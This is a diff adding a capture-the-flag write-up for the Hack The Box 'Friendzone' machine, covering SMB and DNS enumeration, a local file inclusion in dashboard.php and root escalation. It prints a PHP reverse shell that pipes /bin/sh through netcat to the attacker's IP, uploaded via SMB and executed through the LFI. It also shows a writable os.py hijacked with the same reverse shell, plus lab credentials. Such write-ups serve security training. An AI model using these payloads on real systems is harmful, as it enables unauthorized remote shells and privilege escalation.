@@ -1,0 +1,137 @@
+HTB-Friendzone-Writeup
+
+IP : 10.10.10.123
+
+Nmap
+----
+- we have 7 ports open
+	- 21 running FTP
+	- 22 running SSH
+	- 53 running DNS
+	- 80 running Apache httpd 2.4.29
+	- 139 running netbios
+	- 443 running Apache httpd 2.4.29
+	- 445 running SMB
+
+- note the domain name friendzone.red
+- add it to /etc/hosts 
+
+Enumeration
+-----------
+- enumerate SMB with smbclient
+
+	smbclient -N -L //10.10.10.123
+
+- we can use smbmap to check on what permissions we have 
+
+	smbmap -H friendzone.htb
+
+- we have read access to general and read/write access to development
+- we can see the comments on the files says /etc/Files which means all the shares are located in /etc 
+- in general we found a file called creds.txt
+
+	creds : admin : WORKWORKHhallelujah@#
+
+- visiting friendzone.red doesnt have much to offer but gave us a new domain name friendzoneportal.red 
+- directory brute forcing the site gave us two more paths 
+	- /wordpress
+	- /robots.txt
+
+- both the paths ended up to be trolls
+- we check out port 443 and we got a gif meme
+- on running directory brute force against the page we get 2 paths 
+	- /admin
+	- /js
+
+- we checked out the page source and we see a commented out path js/js/
+- on checking https://friendzone.red/js/js/ we get a long string
+- we do get a clue on zone transfer
+- we are pretty much done with port 443 now we can move on to port 53 DNS
+- we use dig to enumerate DNS zone transfers 
+
+	dig axfr friendzone.red @10.10.10.123
+	dig axfr friendzoneportal.red @10.10.10.123
+
+- we got plenty of hosts to enumerate from this
+
+	- friendzone.red
+	- administrator1.friendzone.red
+	- hr.friendzone.red
+	- uploads.friendzone.red   
+	- friendzoneportal.red
+	- admin.friendzoneportal.red
+	- files.friendzoneportal.red
+	- imports.friendzoneportal.red
+	- vpn.friendzoneportal.red
+
+- we can update our /etc/hosts file with all this entries 
+- we can run aquatone to capture screenshots of all the hosts above 
+- save the list of hosts into a file called hosts.out 
+- run it with aquatone 
+
+	cat hosts.out | aquatone
+
+- we got all the screenshots 
+- we have 2 login pages
+
+	- admin.friendzoneportal.red the credentials from smb works but not of any use to us 
+	- administrator1.friendzone.red is a login form worth spending time on
+
+- visiting administrator1.friendzone.red, we try with the credentials from SMB and got in and got a message asking us to visit /dashboard.php
+- on visiting /dashboard we get an untested application with sloppy text and an error message 
+- the text in the page asked us to add image_id=a.jpg&pagename=timestamp parameters to the url to show image 
+- we tried that and got trolled again
+
+	https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp
+
+- we directory brute force the page qith php extension and got the following results  
+	- /images
+	- /login.php
+	- /dashboard.php
+	- /timestamp.php
+
+Shell as www-data
+-----------------
+- since we have 2 controllabele parameters in our hand we can check for possible LFI in both image_id and pagename
+- if thisis really vulnerable to LFI we will be able to access files from the shares via the url
+- we can upload a php reverse shell called rev.php to development share via smb 
+
+	<?php
+	system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.54 1337 >/tmp/f');
+	?>
+
+- upload it to smb development share 
+
+	 smbclient //friendzone.htb/development -U ""
+	 put rev.php
+
+- since we know the share location is /etc we can access it through the url
+
+	 https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&pagename=/etc/Development/rev
+
+- start a netcat listener
+
+	nc -lnvp 1337
+
+- we got a shell as www-data
+- grab the user flag 
+
+Priv-esc
+--------
+- while looking around we looked at /var/www and found a file called mysql_data.conf and found credentials
+
+	creds : friend : Agpyu12!0.213$
+
+- we tried SSH into the box with this credentials and succeeded 
+- we transferred and ran pspy in the box and found that root runs /opt/server_admin/reporter.py from time to time
+- while checking the script we can see that its importing pythons os library and friend user has permission to write to os.py. 
+- add these two lines to the bottom of the os.py 
+	import os
+	os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.54 9001 >/tmp/f') 
+
+- start a netcat listener
+
+	nc -lnvp 9001
+
+- we got shell as root 
+- grab the root flag 
